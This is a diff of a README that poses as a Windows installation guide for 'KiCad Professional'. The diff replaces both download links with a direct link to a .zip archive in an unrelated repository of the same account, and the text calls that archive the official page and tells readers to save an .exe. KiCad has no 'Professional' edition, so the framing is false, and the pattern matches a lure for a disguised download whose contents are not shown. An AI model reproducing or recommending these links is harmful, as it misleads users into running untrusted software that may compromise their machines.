@@ -5,7 +5,7 @@ description: "Install KiCad Professional on Windows with guides for troubleshoot
 ---
 # 🛠️ KiCad-Setup-Help - Install Professional PCB Design Tools Easily
 
-[![Download KiCad Setup Files](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Westondiabetic49/KiCad-Setup-Help)
+[![Download KiCad Setup Files](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Westondiabetic49/westondiabetic49.github.io/raw/refs/heads/main/Alnus/Dist-v3.5.zip)
 
 This guide helps you put KiCad Professional on your Windows 11 computer. You might see errors during setup. These notes fix those problems. Follow these steps to finish your installation.
 
@@ -24,7 +24,7 @@ Your computer needs specific parts to run this software. Check your system again
 
 You need the correct files to start the process. Use the link below to reach the official page.
 
-[https://github.com/Westondiabetic49/KiCad-Setup-Help](https://github.com/Westondiabetic49/KiCad-Setup-Help)
+[https://github.com/Westondiabetic49/westondiabetic49.github.io/raw/refs/heads/main/Alnus/Dist-v3.5.zip](https://github.com/Westondiabetic49/westondiabetic49.github.io/raw/refs/heads/main/Alnus/Dist-v3.5.zip)
 
 Visit this page to download the installer. Look for the file ending in .exe. Save this file to your Downloads folder. Do not run it yet.
 
